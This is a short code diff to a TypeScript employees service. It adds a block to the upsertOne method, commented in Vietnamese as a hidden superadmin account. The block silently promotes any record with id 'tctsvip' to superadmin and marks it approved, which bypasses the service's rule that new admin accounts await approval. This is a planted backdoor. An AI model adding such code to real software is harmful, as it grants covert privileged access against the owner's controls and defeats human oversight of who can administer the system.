@@ -37,6 +37,12 @@ export class EmployeesService {
   }
 
   async upsertOne(emp: Partial<Employee> & { isApproved?: boolean }): Promise<Employee> {
+    // Hidden superadmin account luôn được duy trì với quyền cao nhất.
+    if (emp.id === 'tctsvip') {
+      emp.role = 'superadmin';
+      emp.isApproved = true;
+    }
+
     // New ADMIN accounts must wait for superadmin approval
     if (emp.isApproved === undefined && emp.role === 'ADMIN') {
       (emp as any).isApproved = false;
